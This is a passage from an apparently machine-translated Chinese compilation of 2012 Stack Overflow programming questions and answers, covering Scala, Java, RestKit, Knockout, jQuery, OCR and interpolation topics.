viewer.addListener(etc... ) 
```

这是我唯一的选择

```
 addSelectionChangedListener(ISelectionChangeListener listener) 
```

我不在乎选择改变了——只有当列表改变了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-13T20:50:55.910

我已经尝试过这个例子，这对我有用：

```
IObservableList observableList = new WritableList();
observableList.addListChangeListener(new IListChangeListener() {

    @Override
    public void handleListChange(ListChangeEvent event) {
        System.out.println(event.diff);
    }
});
observableList.add("element");
observableList.add("element");
observableList.add("element");

TableViewer viewer = new TableViewer(parent, SWT.H_SCROLL | SWT.V_SCROLL);
viewer.getTable().setHeaderVisible(true);
viewer.getTable().setHeaderVisible(true);
viewer.setContentProvider(new ObservableListContentProvider());

TableViewerColumn column = new TableViewerColumn(viewer, SWT.NONE);
column.getColumn().setText("Column");
column.getColumn().setWidth(200);

column.setLabelProvider(new ColumnLabelProvider());

// Provide the input to the ContentProvider
viewer.setInput(observableList); 
```

现在 IListChangeListener 在应用程序启动时被调用 3 次，然后每次我向 observableList 添加元素时。

# scala - 实现 Trait 时出现编译错误

> ID：13845161
> 
> 赞同：0
> 
> 时间：2012-12-12T17:20:08.203
> 
> 标签：scala, traits

给定这段代码：（不管它是否没有多大意义）

```
 object Test {

          def main(args: Array[String]) {
           (new FooImpl2()).foo()
          }

          trait Foo {
            def foo()
          }

          trait M extends Foo {
            abstract override def foo() {println("M"); super.foo()}
          }

          abstract class FooImpl1 extends Foo {

          }

          class FooImpl2 extends FooImpl1 with M{
            override def foo() {println("Impl2")}
          }

    } 
```

在编译时，会发生此错误：

```
error: overriding method foo in trait M of type ()Unit;
method foo needs `abstract override' modifiers
override def foo() {println("Impl2")} 
```

所以在这个地方：

```
class FooImpl2 extends FooImpl1 with M{
    override def foo() {println("Impl2")}
} 
```

为什么不`override`适用`FooImpl1`（以便为抽象特征方法提供具体实现）？似乎它与 trait 方法相匹配......显然与模式“ `abstract override`”存在巨大冲突

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:31:58.873

M 需要在具体 def 之后混入（按线性化顺序）。

# ios - RestKit 0.20.0-pre3 错误-[NSManagedObjectContext saveToPersistentStore:]：无法识别的选择器发送到实例

> ID：13845163
> 
> 赞同：2
> 
> 时间：2012-12-12T17:20:16.313
> 
> 标签：ios, cocoa, core-data, ios6, restkit

我通过 CocoaPods 安装了 RestKit (0.20.0-pre3) 并按照文档说明对其进行了配置。执行 getObjectsAtPath 和 RestKit 时，我得到了映射：

> ***由于未捕获的异常“NSInvalidArgumentException”而终止应用程序，原因：“-[NSManagedObjectContext saveToPersistentStore:]：无法识别的选择器发送到实例 0x9eaae40”

如果我设置断点，它会在第 278 行的 RKManagedObjectRequestOperation.m 处停止。

我将 RestKit 配置如下：

```
- (void)configureRestKit{

    //initialize RestKit
    LLog(DEBUG_LEVEL, @"init RestKit");

    NSString *baseURL;

    // Log all HTTP traffic with request and response bodies
    //RKLogConfigureByName("RestKit/Network", RKLogLevelTrace);

    // Log debugging info about Core Data
    RKLogConfigureByName("RestKit/CoreData", RKLogLevelTrace);

    //Loging about the Entity Mapping
    RKLogConfigureByName("RestKit/ObjectMapping", RKLogLevelTrace)

    // enable activity indicator
    [AFNetworkActivityIndicatorManager sharedManager].enabled = YES;

    if (local) {
        baseURL = @"http://xyz.net";

    } else {
        baseURL = @"http://XYZ.net";
    }

    [RKMIMETypeSerialization registerClass:[RKNSJSONSerialization class] forMIMEType:@"application/json"];

    _objectManager = [RKObjectManager managerWithBaseURL:[NSURL URLWithString:baseURL]];

    _managedObjectModel = [NSManagedObjectModel mergedModelFromBundles:nil];
    _managedObjectStore = [[RKManagedObjectStore alloc] initWithManagedObjectModel:_managedObjectModel];

    NSString *path = [RKApplicationDataDirectory() stringByAppendingPathComponent:@"XYZ.sqlite"];
    //LLog(DEBUG_MODE,@"The object store: %@", _objectStore.description);

    [_managedObjectStore addSQLitePersistentStoreAtPath:path fromSeedDatabaseAtPath:nil withConfiguration:nil options:nil error:nil];

    [_managedObjectStore createManagedObjectContexts];
    [_managedObjectStore createPersistentStoreCoordinator];

    _managedObjectContext = _managedObjectStore.persistentStoreManagedObjectContext;
    _persistentStoreCoordinator = _managedObjectStore.persistentStoreCoordinator;
    _managedObjectModel = _managedObjectStore.managedObjectModel;

    _objectManager.managedObjectStore = _managedObjectStore;

    // 2012-06-13T00:00:00+01:00
    NSDateFormatter *dateFormatter = [NSDateFormatter new];
    [dateFormatter setDateFormat:@"yyyy-MM-dd'T'HH:mm:ss'+01:00'"];
    dateFormatter.timeZone = [NSTimeZone timeZoneWithAbbreviation:@"UTC"];
    dateFormatter.locale = [[NSLocale alloc] initWithLocaleIdentifier:@"en_US_POSIX"];

    // Set it Globally
    [RKObjectMapping setPreferredDateFormatter:dateFormatter];

    LLog(DEBUG_LEVEL, @"DateFormater Test: %@", [dateFormatter stringFromDate:[NSDate date]]);

    // Add Entity Mapping
    RKEntityMapping *experienceMapping = [RKEntityMapping mappingForEntityForName:@"Experience" inManagedObjectStore:_managedObjectStore];
    [experienceMapping addAttributeMappingsFromArray:@[@"experienceid", @"city", @"descr", @"lat", @"lng", @"number", @"price", @"street"]];
    experienceMapping.identificationAttributes = @[@"experienceid"];

    NSIndexSet *statusCodes = RKStatusCodeIndexSetForClass(RKStatusCodeClassSuccessful); // Anything in 2xx
    RKResponseDescriptor *responseDescriptor = [RKResponseDescriptor responseDescriptorWithMapping:experienceMapping pathPattern:@"/test.json" keyPath:@"experience" statusCodes:statusCodes];
    [_objectManager addResponseDescriptor:responseDescriptor];

    // ######  ONLY FOR TEST REASONS ######

    NSManagedObject *test = [NSEntityDescription
                                       insertNewObjectForEntityForName:@"Experience"
                                       inManagedObjectContext:_managedObjectContext];
    [test setValue:[NSNumber numberWithInt:1] forKey:@"experienceid"];
    [test setValue:@"Testville" forKey:@"city"];

    NSError *error;
    if (![_managedObjectContext save:&error]) {
        NSLog(@"Whoops, couldn't save: %@", [error localizedDescription]);
    }

    [_objectManager getObjectsAtPath:@"/test.json" parameters:nil success:^(RKObjectRequestOperation *operation, RKMappingResult *mappingResult) {
     // Handled with articleDescriptor
        LLog(DEBUG_LEVEL, @"Test");
     } failure:^(RKObjectRequestOperation *operation, NSError *error) {
     // Transport error or server error handled by errorDescriptor
     }];

} 
```

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-15T16:39:43.673

这很可能表明您的链接器标志设置不正确。需要链接器`-ObjC`标志才能加载类别方法。您是否覆盖了目标上的链接器标志？`$(inherited)`如果您在目标级别上有其他配置，您至少需要包括。在 Xcode 中查看设置时，您应该会看到`-ObjC`出现在链接器标志中。

# scala - 从 1 - 1000 获取可被 3 或 5 整除的元素列表

> ID：13845166
> 
> 赞同：3
> 
> 时间：2012-12-12T17:20:38.557
> 
> 标签：scala

我正在尝试在 scala 中编写一种功能方法来获取 1 到 1000 之间可被 3 或 5 整除的所有数字的列表

这是我到目前为止所拥有的：

```
 def getListOfElements(): List[Int] = { 
  val list = List()

    for (i <- 0 until 1000) {
        //list.
  } 
  list match {
    case Nil => 0
  } 
  list
} 
```

for 循环似乎是一种命令式方法，我不确定在案例类中匹配什么。请指导一下？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-12T17:27:48.553

这是我如何使用`for`表达式来完成的。

```
for( i <- 1 to 1000 if i % 3 == 0 || i % 5 == 0) yield i 
```

这给出了：

```
 scala.collection.immutable.IndexedSeq[Int] = Vector(3, 5, 6, 9, 10, 12, 15, 18, 20, 21... 
```

这是另一种过滤`Range`数字的方法。

```
scala> 1 to 1000
res0: scala.collection.immutable.Range.Inclusive = Range(1, 2, 3, 4, 5, 6, 7, 8, 9, 10...

scala> res0.filter(x => x % 3 == 0 || x % 5 == 0)
res1: scala.collection.immutable.IndexedSeq[Int] = Vector(3, 5, 6, 9, 10, 12, 15, 18, 20, 21... 
```

如果你真的想`List`在返回值上使用`toList`. 例如`res0.toList`。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-12T17:40:48.557

```
(Range(3, 1000, 3) ++ Range(5, 1000, 5)).toSet.toList.sorted 
```

排序可以省略。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-12T17:56:35.577

另一种方法：

```
(1 to 1000).filter(i => i % 3 == 0 || i % 5 == 0) 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-12-12T17:31:16.633

看起来布赖恩打败了我:)

只是想我会提到 Stream 在这里可能更可取以获得更好的性能：

```
val x = (1 until 1000).toStream           //> x  : scala.collection.immutable.Stream[Int] = Stream(1, ?)
x filter (t=>(t%3==0)||(t%5==0))          //> res0: scala.collection.immutable.Stream[Int] = Stream(3, ?) 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2014-12-22T23:43:41.450

projecteuler.net 的问题最后还需要这些数字的总和。

“求 1000 以下所有 3 或 5 的倍数之和。”

```
object prb1 {
  def main(args: Array[String]) {
    val retval = for{ a <- 1 to 999
                      if a % 3 == 0 || a % 5 == 0
    } yield a
    val sum = retval.reduceLeft[Int](_+_)
    println("The sum of all multiples of 3 and 5 below 1000 is " + sum)
  }
} 
```

正确答案应该是**233168**

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-12T20:51:01.070

没有划分或列表娱乐没有任何答案。递归没有任何答案。

另外，任何基准测试？

```
@scala.annotation.tailrec def div3or5(list: Range, result: List[Int]): List[Int] = {
  var acc = result
  var tailList = list
  try {
    acc = list.drop(2).head :: acc   // drop 1 2 save 3
    acc = list.drop(4).head :: acc   // drop 3 4 save 5
    acc = list.drop(5).head :: acc   // drop 5 save 6 
    acc = list.drop(8).head :: acc   // drop 6 7 8 save 9
    acc = list.drop(9).head :: acc   // drop 9 save 10
    acc = list.drop(11).head :: acc  // drop 10 11 save 12
    acc = list.drop(14).head :: acc  // drop 12 13 14 save 15 
    tailList = list.drop(15)         // drop 15             
  } catch {
    case e: NoSuchElementException => return acc // found
  }
  div3or5(tailList, acc) // continue search  
}

div3or5(Range(1, 1001), Nil) 
```

**编辑**

```
scala> val t0 = System.nanoTime; div3or5(Range(1, 10000001), Nil).toList; 
(System.nanoTime - t0) / 1000000000.0
t0: Long = 1355346955285989000
res20: Double = 6.218004 
```

对我来说看起来不错的答案之一：

```
scala> val t0 = System.nanoTime; Range(1, 10000001).filter(i => 
i % 3 == 0 || i % 5 == 0).toList; (System.nanoTime - t0) / 1000000000.0
java.lang.OutOfMemoryError: Java heap space 
```

另一个：

```
scala> val t0 = System.nanoTime; (Range(1, 10000001).toStream filter (
(t: Int)=>(t%3==0)||(t%5==0))).toList ; (System.nanoTime - t0) / 1000000000.0
java.lang.OutOfMemoryError: Java heap space 
```

第一：

```
scala> val t0 = System.nanoTime; (for( i <- 1 to 10000000 if i % 3 == 0 || 
i % 5 == 0) yield i).toList; (System.nanoTime - t0) / 1000000000.0
java.lang.OutOfMemoryError: Java heap space 
```

为什么 Scala 不优化例如 Vector -> List？

# java - 为最终变量赋值

> ID：13845174
> 
> 赞同：1
> 
> 时间：2012-12-12T17:20:54.517
> 
> 标签：java, callback, final

假设我有这个代码：

```
public HttpResponse myFunction(...) {
    final HttpResponse resp;
    OnResponseCallback myCallback = new OnResponseCallback() {
        public void onResponseReceived(HttpResponse response) {
            resp = response;
        }
    };
    // launch operation, result will be returned to myCallback.onResponseReceived()
    // wait on a CountDownLatch until operation is finished
    return resp;
} 
```

显然我不能从 onResponseReceived 为 resp 赋值，因为它是一个最终变量，但是如果它不是最终变量 onResponseReceived 就看不到它。那么，如何从 onResponseReceived 为 resp 分配一个值？

我的想法是创建一个包装类来封装 resp 对象。最终对象将是这个包装类的一个实例，我可以将值分配给在最终类（不是最终的）内的对象上工作。

代码将是这个：

```
class ResponseWrapper {
    HttpResponse resp = null;
}

public HttpResponse myFunction(...) {
    final ResponseWrapper respWrap = new ResponseWrapper();
    OnResponseCallback myCallback = new OnResponseCallback() {
        public void onResponseReceived(HttpResponse response) {
            respWrap.resp = response;
        }
    };
    // launch operation, result will be returned to myCallback.onResponseReceived()
    // wait on a CountDownLatch until operation is finished
    return respWrap.resp;
} 
```

您如何看待这个解决方案？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-12T17:28:06.017

[java.util.concurrent.atomic.AtomicReference](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/atomic/AtomicReference.html)

标准做法是使用最终的 AtomicReference，您可以设置和获取它。这也增加了线程安全的好处 :) 正如您所提到的，CountDownLatch 有助于等待完成。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-12T17:29:52.680

您的解决方案与其他解决方案一样有效。其他流行的选择包括单元素数组

```
final HttpResponse[] resp = new Response[1];
// In the callback
resp[0] = response;
// After the operation
return resp[0]; 
```

和通用包装器

```
public class Ref<T> {
  public T value;
}

final Ref<HttpResponse> resp;
// In the callback
resp.value = response;
// After the operation
return resp.value; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T17:36:19.787

您可以使用 a 将 hand-back 和 wait 合二为一`SynchronousQueue`（省略异常处理）

```
public HttpResponse myFunction(...) {
    final Queue<HttpResponse> resp = new SynchronousQueue<HttpResponse>();
    OnResponseCallback myCallback = new OnResponseCallback() {
        public void onResponseReceived(HttpResponse response) {
            resp.put(response);
        }
    };
    return resp.take();
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T17:29:26.493

我要做的改变是使用[AtomicReference](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/atomic/package-summary.html)，因为这显然是多线程的，您不必编写自己的包装器。否则，对我来说似乎是合理的。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-12T17:30:47.350

您可以使其可变和最终；) 最简单的方法是使用 na 数组，但也可以使用 AtomicReference。

```
public HttpResponse myFunction(...) {
    final HttpResponse[] resp = { null };
    OnResponseCallback myCallback = new OnResponseCallback() {
        public void onResponseReceived(HttpResponse response) {
            resp[0] = response;
        }
    };
    // launch operation, result will be returned to myCallback.onResponseReceived()
    // wait on a CountDownLatch as soon as operation is finished
    return resp[0];
} 
```

或者

```
public HttpResponse myFunction(...) {
    final AtomicReference<HttpResponse> resp = new AtomicReference<HttpResponse>();
    OnResponseCallback myCallback = new OnResponseCallback() {
        public void onResponseReceived(HttpResponse response) {
            resp.set(response);
        }
    };
    // launch operation, result will be returned to myCallback.onResponseReceived()
    // wait on a CountDownLatch as soon as operation is finished
    return resp.get();
} 
```

# ocr - Kofax Capture 识别 - I vs 1

> ID：13845179
> 
> 赞同：3
> 
> 时间：2012-12-12T17:21:11.490
> 
> 标签：ocr, capture, kofax

使用 Kofax Capture 10（SP1、FP2），我在文档的某些字段上设置了识别区域。这些字段始终将 I 识别为 1。我已经尝试了所有我能想到的设置组合，它们不会抹去该字段中的所有字符，但无济于事。我尝试过 Advanced OCR 和 High Performance OCR，不同的字符过滤器。各种事情。

我可以尝试哪些选项来自动识别此字符？我应该告诉制作表格的人（它们是由计算机生成的）他们需要尝试使用不同的字体吗？说服他们现在是考虑使用验证的时候了？

我当前的字段设置：

Kofax Advanced OCR 没有自定义设置，除了高级对话框中的最大化准确度。这和我迄今为止尝试过的任何其他方法一样有效。

使用的字体是 8 - 12 pt arial，顺便说一句。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T20:31:53.103

如果涉及 OCR，无论是处理电子文档还是纸质文档，验证都是**必须的。**对于纸质文档，这是一个更大的必须。

使用至少 11pt Arial 并将文档渲染为 300 dpi 图像。这会给你我说的 99.9% 的准确率（即每 1000 个错过的字符中有 1 个字符）。如果您的数据中数字和字母混合在一个单词中，尤其是 1-I、0-O、6-G，则准确性可能会下降。

如果您知道没有此类混合数据并且 OCR 仍返回混合的数字和字母，则可以使用识别脚本。您可以使用 PostRecognition 脚本事件从 OCR 引擎捕获识别结果，并使用 SBL 或 VB.NET 脚本对其进行修改。但这在很大程度上取决于您处理的文档和数据。

图像清理对电子文档没有任何好处。

我会说你最好的办法是使用验证。至少这会将责任推给验证操作员。

# java - 在 Java 中使用抽象类时的编码风格

> ID：13845182
> 
> 赞同：2
> 
> 时间：2012-12-12T17:21:21.737
> 
> 标签：java, abstract-class

当从基类继承而不是所有方法都会实现的场景时，最好将空方法放在基类中，以便不需要该方法的子类可以完全忽略它，而其他类必须覆盖如果他们想实现它的方法......例如：

基类：

```
public void myMethod() {
} 
```

未实现的子类：

```
<nothing!> 
```

还是让基类更干净，只放入一个抽象方法并强制子类充实一个空白方法，如果它没有实现该方法？

基类：

```
public abstract void myMethod(); 
```

未实现的子类：

```
public void myMethod() {
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:25:20.207

这是您的设计决定。如果您想强制您的开发人员覆盖 myMethod 并开发逻辑。你应该去抽象类。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T17:25:22.377

编码风格取决于您，取决于您的要求，一切都有其优点和缺点。

在抽象类的情况下，不必只放置抽象方法。我会推荐你​​，最好使用接口。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T17:26:51.300

两者都不是最优雅的解决方案，尽管两者都可以完成工作。使用设计模式策略设计模式[http://www.newthinktank.com/2012/08/strategy-design-pattern-tutorial/](http://www.newthinktank.com/2012/08/strategy-design-pattern-tutorial/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-12T17:27:52.180

这取决于你，这取决于具体情况。

当您有一个抽象类并且您想要扩展它的类来实现该方法时，您可以使用抽象方法（因为抽象父类使用抽象方法 - 它可能类似于`print()`）。它类似于接口的方法，但通常用于不同的场景。但在大多数情况下我会使用**界面......**

我只会在`myMethod()`扩展抽象父级的每个类中做不同的事情的情况下使用抽象方法......否则，如果`myMethod()`通常做同样的事情并且一个或两个类需要覆盖它，我将使用第一个解决方案。

另请查看模板方法模式。我不知道你的情况是什么，所以我无法准确回答这个问题......

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-12T17:40:28.563

只要有可能，你应该

**更喜欢接口而不是抽象类**

因为接口不允许包含方法实现，所以有所谓的 Abstract*Interface*，它是两种技术的组合：在这种情况下，*接口*定义类型，而抽象类提供框架实现。
一个例子是提供骨架实现的集合框架：`AbstractCollection, AbstractList, AbstractSet and AbstractMap.`

更多信息参见 Josh Bloch，Effective Java 2nd Edition，Item 18

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-12-12T17:47:50.093

我认为这归结为 myMethod() 是否存在有意义的默认实现。如果有，请将其放在基类中，子类仅在需要不同的东西时才覆盖。

如果没有有意义的默认值，并且实际上每个非抽象子类都应该实现方法本身或从中间类继承实现，那么在基类中提供假实现是一个非常糟糕的主意。它将编译器可能检测到的错误转换为只能通过测试找到的错误。

在某些情况下要考虑的一个选项是提供引发 UnsupportedOperationException 的默认实现。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-12T17:23:46.120

抽象类的不同之处在于您可以但不能覆盖该函数。

所以`public void nothing() {}`可以被覆盖并且`public abstract void nothing2();`必须被覆盖。

# java - 阿帕奇长耳兔。Session.importXML() 和观察

> ID：13845187
> 
> 赞同：1
> 
> 时间：2012-12-12T17:21:33.983
> 
> 标签：java, jackrabbit

我正在使用 Apache Jackrabbit 的导入功能来导入系统视图 XML。

```
session.importXML(parentNode.getPath(),inputStream,ImportUUIDBehavior.IMPORT_UUID_COLLISION_THROW); 
```

正在使用 XML 的内容创建一个新节点，在导入之前我注册了一个事件侦听器，只是为了访问新创建的节点并执行一些导入后操作，我以这种方式注册了我的侦听器：

```
EventListener afterImportListener = new EventListener() {...}
observationManager.addEventListener(afterImportListener, Event.NODE_ADDED,stageNode.getPath(),true,null,null,false); 
```

没有事件被分派到我的 EventListener。观察是否适用于 importXML？导入后还有其他方法可以访问新创建的节点吗？

# twitter-bootstrap - 带有 Knockoutjs 的 Twitter 引导程序 - 单选按钮值

> ID：13845193
> 
> 赞同：2
> 
> 时间：2012-12-12T17:22:10.560
> 
> 标签：twitter-bootstrap, knockout.js, jquery

我有一个使用 twitter bootstrap 和 Knockoutjs 的 ASP.Net MVC4 网站。要求之一是当用户在某些选项之间切换时刷新视图模型。为此，我设置了以下单选按钮

```
<div id = "myradio" class="btn-group" data-toggle="buttons-radio">
  <button value="1" type="button" class="btn btn-primary active" data-bind="click: refresh">1</button>
  <button value="2" type="button" class="btn btn-primary" data-bind="click: refresh">2</button>
  <button value="3" type="button" class="btn btn-primary" data-bind="click: refresh">3</button>
</div>​ 
```

我的 Knockoutjs 视图模型是

```
function ViewModel() {
    var self = this;

    //this function is called when the radio button is clicked
    self.refresh = function(){
    alert($('#myradio > button.active').val());
    };
} 
```

我遇到的问题是单击事件触发得太快并给了我单选按钮的先前值而不是当前值。为了演示这个问题，我设置了一个 jsfiddle

[http://jsfiddle.net/73yMR/2/](http://jsfiddle.net/73yMR/2/)

有什么方法可以让我获得当前值吗？knockoutjs 是否允许将事件传递到“刷新”函数中？只要我可以检测到在运行刷新功能时选择了哪个单选选项，我愿意接受任何想法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T17:53:30.430

Knockout 将`event`对象作为第二个参数（第一个参数是“当前数据”）传递给处理函数（您可以在[文档](http://knockoutjs.com/documentation/click-binding.html)`click`中阅读更多相关信息）

所以下面的代码会产生预期的结果：

```
self.refresh = function(data, element){
    alert($(element.currentTarget).val());
}; 
```

一个工作的[JSFiddle](http://jsfiddle.net/73yMR/5/)。

# java - 避免使用 cookie 登录 Java Web 应用程序

> ID：13845198
> 
> 赞同：0
> 
> 时间：2012-12-12T17:22:29.067
> 
> 标签：java, web-applications, servlets, cookies

我正在使用 Tomcat 7 创建一个简单的 Java webapp。在这个站点中，只有登录的用户可以查看内容，所以我有一个主页**index.jsp**，它只包含 2 个表单，一个用于登录，另一个用于唱歌。只有在用户登录或注册后，他才能访问网站内容。

我想避免用户每次都输入用户名和密码，所以我想我可以使用 cookie 来实现这一点，对吧？

如果它是正确的，我想知道怎么做......我的第一个方法是使用一个servlet，并使用这个servlet的url作为我的webapp的入口点，但我不确定这是最好的做法...

无论如何，如果最终这是一个好习惯，我可以将此网址设置为默认入口点或类似的东西吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:28:46.960

将密码以纯文本形式存储在 cookie 中是不安全的。

相反，您可以使用在您提供用户名和密码时从网站发出的称为“令牌”的长字符串。有关详细信息，请参阅[http://jaspan.com/improved_persistent_login_cookie_best_practice 。](http://jaspan.com/improved_persistent_login_cookie_best_practice)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T17:30:09.617

我会使用过滤器。过滤器可以检查 cookie 并处理其中的授权片段。谷歌搜索[“jsp记住我”](https://www.google.com/search?q=jsp%20remember%20me&rlz=1C1CHFX_enUS459US459&oq=jsp%20remember%20me&aqs=chrome.0.57j60j62l3j59.1919&sugexp=chrome,mod=13&sourceid=chrome&ie=UTF-8)会给你更多的想法：

# jquery - 锚标签和 JQuery Slider 问题

> ID：13845199
> 
> 赞同：0
> 
> 时间：2012-12-12T17:22:38.923
> 
> 标签：jquery, anchor, slideshow

所以我有这个很棒的幻灯片代码，它与我的 img 标签完美配合，直到我将它们包装在一个锚标签中。幻灯片不仅抓取 img 标签，还抓取锚标签并显示它们。换句话说，它不是循环浏览 4 张图像，而是循环浏览 4 张图像，然后是 4 个锚标签。这会在初始图像之后产生 4 个空白图像。

```
 <script type="text/javascript">

      $(function(){
          $('div.fadein  a img.bestof:gt(0)').hide();
          setInterval(function(){
        $('div.fadein a img.bestof:first-child').fadeOut()
           .next('img.bestof').fadeIn()
           .end().appendTo('.fadein');}, 
        3000);
      });

      </script>

      <style>
      .fadein { position:relative; width:200px; height:160px; }
      .fadein img { position:absolute; left:0; top:0; }
      </style>

      <div class="fadein">
        <?php foreach ($array as $image){
          print("
           <a href='$image[link]' target='$target'><img src='$image[image]' class='bestof' style='width:200px; height:160px;' ></a>
         "); } ?>
      </div> 
```

我需要锚标签的任何建议，以便我可以使每个图像都可点击。我尝试只循环浏览 Anchor 标签，但没有弹出图像。

这是生成的 HTML。

```
<script type="text/javascript">

$(function(){
    $('div.fadein  a img.bestof:gt(0)').hide();
    setInterval(function(){
      $('div.fadein a img.bestof:first-child').fadeOut()
         .next('img.bestof').fadeIn()
         .end().appendTo('.fadein');}, 
      3000);
});

</script>

<style>
.fadein { position:relative; width:200px; height:160px; }
.fadein img { position:absolute; left:0; top:0; }
</style>

<div class="fadein">

     <a href='http://google.com' target='_blank'><img src='http://4.bp.blogspot.com/-PilKprMNhpo/TVc4rKk_gKI/AAAAAAAAAWo/O3wPK3kIH_8/s1600/two_flowers.preview.jpg' class='bestof' style='width:200px; height:160px;' ></a>

     <a href='http://hooplaha.com' target='_blank'><img src='http://www.redbudfarms.com/wp-content/uploads/2011/01/cone-flowers-preview.jpg' class='bestof' style='width:200px; height:160px;' ></a>

     <a href='http://facebook.com' target='_blank'><img src='http://images.fanpop.com/images/image_uploads/Flower-Wallpaper-flowers-249398_1693_1413.jpg' class='bestof' style='width:200px; height:160px;' ></a>

     <a href='http://bing.com' target='_blank'><img src='http://www.rosarian.com/graphics/images/rose.jpg' class='bestof' style='width:200px; height:160px;' ></a>

     <a href='http://linkedin.com' target='_blank'><img src='http://blog.zap2it.com/pop2it/rainbow-roses.jpg' class='bestof' style='width:200px; height:160px;' ></a>
   </div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:53:02.697

> **[演示： http](http://jsbin.com/welcome/61090) **://jsbin.com/welcome/61090****

 **```
<script type="text/javascript">
    $(function() {
        $('div.fadein  a:gt(0)').hide();
        setInterval(function() {
            $('div.fadein a:first-child').fadeOut().next('a').fadeIn().end().appendTo('.fadein');
        }, 1000);
    });

</script>

<style>
    .fadein a {
        position: absolute;
        left: 0;
        top: 0;
        display: inline-block;
    }
    .fadein {
        position: relative;
    }
    .fadein img, .fadein, .fadein a {
        width: 200px;
        height: 160px;
    }
</style> 
```**

# javascript - 除非在 AJAX 调用的成功处理程序中，否则在 AJAX 调用链之后 jquery blockui 中的图像损坏

> ID：13845203
> 
> 赞同：0
> 
> 时间：2012-12-12T17:22:47.340
> 
> 标签：javascript, jquery, ajax, jquery-blockui

好的，所以我有一个模糊的问题。我知道问题所在和解决方案，但我不明白为什么。

有一种方法可以逐步完成一些准备工作、验证、保存和清理。我们在几个不同的情况下都有这个逻辑。我希望了解为什么第一种方法有效但第二种方法显示“doneMessage”的损坏图像是否有丢失的参考或类似的东西？

我想我会在刷新页面之前得到关于为什么 UI 被阻止的问题。在调用此方法之前，UI 被一条请等待消息阻塞，该消息完美运行。这只是对用户的视觉确认，即在刷新页面之前确实发生了保存。

AjaxCall 的代码只是一个简单的 JSON AJAX 调用。如果需要，我可以发布代码，但我认为它与问题无关。

这适用于 AJAX 调用的成功处理程序中的 $.blockUI 调用

```
 function Step(stepNumber) {
        switch (stepNumber) {
            case 1:
                ajaxParameters = "blah:'" + blah + "', yada:" + yada;
                setTimeout(function () { Step(2) }, 50);
                break;
            case 2:
                AjaxCall("FormStyle.aspx", "Validate", ajaxParameters, function () {
                    setTimeout(function () { Step(3) }, 50);
                });
                break;
            case 3:
                AjaxCall("FormStyle.aspx", "Save", ajaxParameters, function () {
                    $.blockUI({ message: doneMessage, css: { padding: 5} });
                    setTimeout(function () { RefreshCurrentPage() }, 50);
                });
                break;
        }
    } 
```

然而，事实并非如此。它显示损坏的图像：

```
 function Step(stepNumber) {
        switch (stepNumber) {
            case 1:
                ajaxParameters = "blah:'" + blah + "', yada:" + yada;
                setTimeout(function () { Step(2) }, 50);
                break;
            case 2:
                AjaxCall("FormStyle.aspx", "Validate", ajaxParameters, function () {
                    setTimeout(function () { Step(3) }, 50);
                });
                break;
            case 3:
                AjaxCall("FormStyle.aspx", "Save", ajaxParameters, function () {
                    setTimeout(function () { Step(4) }, 50);
                });
                break;
            case 4:
                $.blockUI({ message: doneMessage, css: { padding: 5} });
                RefreshCurrentPage()
                break;
        }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:25:44.983

确保设置了 ajax 参数`async: false`。这将确保您的代码在此代码完成之前不会执行任何其他操作。

# c++ - n维插值c++算法

> ID：13845207
> 
> 赞同：2
> 
> 时间：2012-12-12T17:22:54.000
> 
> 标签：c++, interpolation, linear-interpolation

如何在 C++ 中实现 n 维插值？在理想情况下，我希望它在实际内核上具有通用性，以便我可以在例如线性和多项式插值之间切换（也许作为开始：线性插值）。这篇文章（[http://pimiddy.wordpress.com/2011/01/20/n-dimensional-interpolation/](http://pimiddy.wordpress.com/2011/01/20/n-dimensional-interpolation/)）讨论了这个东西，但我有两个问题：1）我不明白如何实现所示的“插值”方法在 C++ 中的文章中 2) 更重要的是，我想在你有“多个自变量 (X)”和“1 个因变量 (Y)”的场景中使用它，并以某种方式在两者上进行插值 (？)

例如，如果 n=3（即 3 维）并且我有以下数据：

```
#X1 X2 X3 Y
10  10 10 3.45
10  10 20 4.52
10  20 15 5.75
20  10 15 5.13 
```

……

我怎么知道 X（自变量）的特定组合的 Y（因变量）的值：17 17 17

我知道存在其他方法，例如决策树和 SVM，但在这里我对插值感兴趣。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:46:21.150

您可以在 alglib 中查看一组插值算法（包括 C++ 实现[）](http://www.alglib.net/interpolation/)。

还应该注意的是，神经网络（例如[反向传播](http://en.wikipedia.org/wiki/Backpropagation)网络）被视为良好的插值器。

如果您的问题是关于特定文章的，那是我不知道的。

# android - 从 Android 将图像上传到 tumblr API

> ID：13845208
> 
> 赞同：17
> 
> 时间：2012-12-12T17:22:55.573
> 
> 标签：android, api, encoding, tumblr

